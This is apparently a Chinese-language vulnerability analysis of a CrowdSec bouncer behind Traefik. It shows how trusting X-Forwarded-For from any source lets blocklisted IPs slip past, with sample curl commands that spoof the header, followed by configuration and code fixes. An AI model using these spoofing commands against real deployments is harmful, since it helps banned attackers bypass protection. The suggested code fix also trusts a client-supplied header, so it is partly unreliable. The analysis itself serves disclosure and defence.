# CrowdSec Bouncer 项目详细解释

## 这个项目是什么？

### CrowdSec 是什么？

**CrowdSec** 是一个开源的、协作式的安全防护系统，类似于 Fail2ban，但更强大：

1. **IP 黑名单系统**
   - 检测恶意行为（DDoS、暴力破解、扫描等）
   - 将被标记为恶意的 IP 加入黑名单
   - 阻止这些 IP 访问服务

2. **协作式防护**
   - 多个 CrowdSec 实例可以共享威胁情报
   - 一个地方检测到攻击，其他地方也会知道

3. **实时防护**
   - 实时检测和阻止攻击
   - 自动更新黑名单

### CrowdSec Bouncer 是什么？

**CrowdSec Bouncer** 是一个 HTTP 服务，用于：
- 与 CrowdSec 集成
- 通过 Traefik Forward Auth 中间件检查 IP 是否在黑名单中
- 如果 IP 在黑名单中，返回 403 Forbidden
- 如果 IP 不在黑名单中，允许访问

### 工作流程

```
客户端请求
  ↓
Traefik (反向代理)
  ↓
Forward Auth 中间件
  ↓
CrowdSec Bouncer (检查 IP)
  ↓
查询 CrowdSec: IP 是否在黑名单？
  ↓
如果在黑名单 → 返回 403 Forbidden
如果不在黑名单 → 返回 200 OK，允许访问
```

## 为什么这个漏洞严重？

### 1. 安全防护系统失效 🔴

**CrowdSec 是一个安全防护系统**，用于阻止恶意 IP 访问。如果被绕过，意味着：

- **被 DDoS 攻击的 IP 仍然可以访问**
- **被标记为恶意扫描的 IP 仍然可以访问**
- **安全防护系统形同虚设**

### 2. 实际伤害场景

**场景 1: DDoS 攻击**
```
1. 攻击者进行 DDoS 攻击
2. CrowdSec 检测到并加入黑名单
3. 攻击者伪造 IP，继续访问
4. 🔴 安全防护完全失效
```

**场景 2: 暴力破解**
```
1. 攻击者进行暴力破解
2. CrowdSec 检测到并加入黑名单
3. 攻击者伪造 IP，继续暴力破解
4. 🔴 安全防护完全失效
```

**场景 3: 恶意扫描**
```
1. 攻击者进行端口扫描
2. CrowdSec 检测到并加入黑名单
3. 攻击者伪造 IP，继续扫描
4. 🔴 安全防护完全失效
```

### 3. 与普通漏洞的区别

| 漏洞类型 | 影响 | 严重程度 |
|---------|------|---------|
| 普通漏洞 | 单个服务受影响 | ⚠️ 中等 |
| **安全防护绕过** | **整个安全系统失效** | 🔴 **严重** |

**关键区别**：
- 普通漏洞：影响单个功能或服务
- 安全防护绕过：**整个安全防护系统失效**，所有被保护的资源都受影响

## 如何攻击的？

### 漏洞链分析

#### 步骤 1: Traefik 配置漏洞

```yaml:24:24:vulnerable_repos_analysis/traefik-crowdsec-bouncer/docker-compose.yaml
      - "traefik.http.middlewares.crowdsec-bouncer.forwardauth.trustForwardHeader=true"
```

**问题**:
- `trustForwardHeader: true` 表示 Traefik 会信任并转发 `X-Forwarded-For` 头
- **没有配置 `trustedIPs` 白名单**
- 这意味着**任何来源**的 `X-Forwarded-For` 头都会被信任

#### 步骤 2: Bouncer 配置漏洞

```go:16:16:vulnerable_repos_analysis/traefik-crowdsec-bouncer/bouncer.go
var trustedProxiesList = strings.Split(OptionalEnv("TRUSTED_PROXIES", "0.0.0.0/0"), ",")
```

**问题**:
- 默认值 `0.0.0.0/0` 表示信任**所有**代理
- Gin 框架的 `ClientIP()` 方法会使用 `X-Forwarded-For`（如果设置了 trusted proxies）
- 这意味着**任何** `X-Forwarded-For` 头都会被使用

#### 步骤 3: Bouncer 代码漏洞

```go:113:123:vulnerable_repos_analysis/traefik-crowdsec-bouncer/controler/controler.go
	clientIP := c.ClientIP()

	log.Debug().
		Str("ClientIP", clientIP).
		Str("RemoteAddr", c.Request.RemoteAddr).
		Str(forwardHeader, c.Request.Header.Get(forwardHeader)).
		Str(realIpHeader, c.Request.Header.Get(realIpHeader)).
		Msg("Handling forwardAuth request")

	// Getting and verifying ip using ClientIP function
	isAuthorized, err := isIpAuthorized(clientIP)
```

**问题**:
- `c.ClientIP()` 会优先使用 `X-Forwarded-For`（因为设置了 trusted proxies）
- 使用这个 IP 查询 CrowdSec 黑名单
- 如果攻击者伪造 `X-Forwarded-For`，就会使用伪造的 IP 查询

### 攻击流程

```
攻击者（真实 IP: 1.2.3.4，已被 CrowdSec 黑名单）
  ↓
发送 HTTP 请求:
  GET / HTTP/1.1
  Host: target.com
  X-Forwarded-For: 192.168.1.100  ← 伪造一个不在黑名单的 IP
  ↓
Traefik 收到请求
  ↓
检查 Forward Auth 配置: trustForwardHeader: true
  ↓ 信任并转发 X-Forwarded-For
转发到 Bouncer:
  X-Forwarded-For: 192.168.1.100
  ↓
Bouncer 收到请求
  ↓
检查 TRUSTED_PROXIES: 0.0.0.0/0（信任所有代理）
  ↓
Gin ClientIP() 使用 X-Forwarded-For: 192.168.1.100
  ↓
查询 CrowdSec: IP = 192.168.1.100 是否在黑名单？
  ↓
CrowdSec: 192.168.1.100 不在黑名单
  ↓
返回: 200 OK ✅
攻击成功！绕过 CrowdSec 黑名单！
```

### 具体攻击命令

#### 步骤 1: 正常访问（IP 被黑名单）

```bash
# 假设攻击者的真实 IP 1.2.3.4 已被 CrowdSec 加入黑名单
curl http://target.com
# 或者明确指定 IP
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com

# 结果: 403 Forbidden
# 因为 IP 1.2.3.4 在黑名单中
```

#### 步骤 2: 攻击 - 伪造 IP

```bash
# 攻击者伪造一个不在黑名单的 IP
curl -H "X-Forwarded-For: 192.168.1.100" http://target.com

# 结果: 200 OK ✅
# 攻击成功！成功绕过 CrowdSec 黑名单！
```

#### 步骤 3: 验证攻击

```bash
# 可以尝试多个伪造的 IP
curl -H "X-Forwarded-For: 10.0.0.1" http://target.com
curl -H "X-Forwarded-For: 172.16.0.1" http://target.com
curl -H "X-Forwarded-For: 8.8.8.8" http://target.com

# 只要伪造的 IP 不在黑名单中，都会返回 200 OK
```

### 攻击效果

**攻击前**:
- 真实 IP: 1.2.3.4（已被黑名单）
- 访问结果: 403 Forbidden
- 状态: ✅ 安全防护正常工作

**攻击后**:
- 伪造 IP: 192.168.1.100（不在黑名单）
- 访问结果: 200 OK
- 状态: 🔴 安全防护被绕过

### 为什么攻击会成功？

1. **Traefik 信任所有 X-Forwarded-For**
   - `trustForwardHeader: true` 且没有 `trustedIPs`
   - 任何来源的 `X-Forwarded-For` 都被信任

2. **Bouncer 信任所有代理**
   - `TRUSTED_PROXIES="0.0.0.0/0"`
   - Gin 的 `ClientIP()` 会使用 `X-Forwarded-For`

3. **使用伪造的 IP 查询黑名单**
   - 查询的是伪造的 IP，不是真实的 IP
   - 伪造的 IP 不在黑名单中，所以返回 200 OK

## 修复方法

### 修复 1: Traefik 配置

```yaml
# 移除 trustForwardHeader
# - "traefik.http.middlewares.crowdsec-bouncer.forwardauth.trustForwardHeader=true"

# 或者在 Traefik 全局配置中添加 trustedIPs
entryPoints:
  web:
    forwardedHeaders:
      trustedIPs:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

### 修复 2: Bouncer 配置

```bash
# 设置正确的 TRUSTED_PROXIES
TRUSTED_PROXIES="10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
# 不要使用 0.0.0.0/0
```

### 修复 3: 代码修复

```go
// 应该使用 RemoteAddr 或 X-Real-IP
// 而不是直接使用 X-Forwarded-For
clientIP := c.GetHeader("X-Real-IP")
if clientIP == "" {
    clientIP = strings.Split(c.Request.RemoteAddr, ":")[0]
}
```

## 总结

### 这个项目是什么？
- **CrowdSec Bouncer** 是一个安全防护系统
- 用于阻止被 CrowdSec 标记为恶意的 IP 访问
- 通过 Traefik Forward Auth 中间件进行 IP 检查

### 为什么严重？
- **安全防护系统失效**：被黑名单的恶意 IP 仍然可以访问
- **实际伤害**：DDoS、暴力破解、恶意扫描等攻击无法被阻止
- **比普通漏洞更严重**：影响整个安全防护系统，而不是单个服务

### 如何攻击？
1. **发送伪造的 X-Forwarded-For 头**
2. **Traefik 信任并转发**（因为 trustForwardHeader: true）
3. **Bouncer 使用伪造的 IP**（因为信任所有代理）
4. **查询 CrowdSec 黑名单**（使用伪造的 IP）
5. **绕过检查**（伪造的 IP 不在黑名单中）

**关键**：攻击者只需要在 HTTP 请求中添加一个 `X-Forwarded-For` 头，就可以绕过整个安全防护系统！

